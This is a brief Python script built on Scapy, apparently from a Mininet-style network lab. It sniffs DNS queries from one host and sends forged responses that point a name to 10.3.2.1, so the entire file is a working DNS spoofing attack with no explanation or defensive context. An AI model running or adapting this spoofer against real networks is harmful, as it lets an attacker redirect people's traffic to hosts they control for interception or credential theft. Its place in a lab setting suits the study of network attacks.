from scapy.all import *
IFACE = "s1-eth1"
FAKE_DNS_IP = "10.3.2.1"
SNIFF_FILTER=" and ".join(["udp dst port 53","src host 10.1.1.1"])


def dns_response(pkt):
	spoof_pkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,qr=1,qd=pkt[DNS].qd,an=DNSRR(rrname="foo.local", rdata=FAKE_DNS_IP))
	send(spoof_pkt, iface=IFACE)

x = sniff(filter=SNIFF_FILTER, prn=dns_response, iface=IFACE)
x.show()
